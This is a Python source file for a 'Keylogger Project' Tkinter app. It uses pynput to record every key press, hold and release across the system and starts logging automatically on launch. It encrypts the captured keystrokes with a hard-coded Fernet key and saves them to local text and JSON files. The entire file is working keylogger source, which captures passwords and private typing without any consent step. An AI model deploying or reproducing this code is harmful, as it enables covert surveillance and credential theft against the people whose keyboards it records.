import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
from cryptography.fernet import Fernet

root = tk.Tk()
root.geometry("150x200")
root.title("Keylogger Page")
root.configure(bg="lightgreen")

key_list = []
x = False
key_strokes = ""

# Replace this key with your own key generated using Fernet.generate_key()
encryption_key = b'Pgizs8I6ElgFIvrvZ7hAs36gxqv464dSMPCJz5n__nQ='

def encrypt_data(data):
    cipher_suite = Fernet(encryption_key)
    encrypted_data = cipher_suite.encrypt(data.encode())
    return encrypted_data


def update_txt_file(key):
    with open('logsencrypt.txt', 'wb') as key_stroke:
        key_stroke.write(encrypt_data(key))


def update_json_file(key_list):
    with open('logsencrypt.json', 'wb') as key_log:
        json_data = json.dumps(key_list)
        key_log.write(encrypt_data(json_data))


def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)


def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))


def start_keylogger():
    print("[+] Running Encryption Keylogger successfully!\n[!] Saving the encrypted key logs in 'logsencrypt.txt' and'logsencrypt.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


empty = Label(root, text="Keylogger Project", font='Verdana 11 bold').grid(row=2, column=2)
root.after(0, start_keylogger)  # Automatically start the keylogger without the button
root.mainloop()
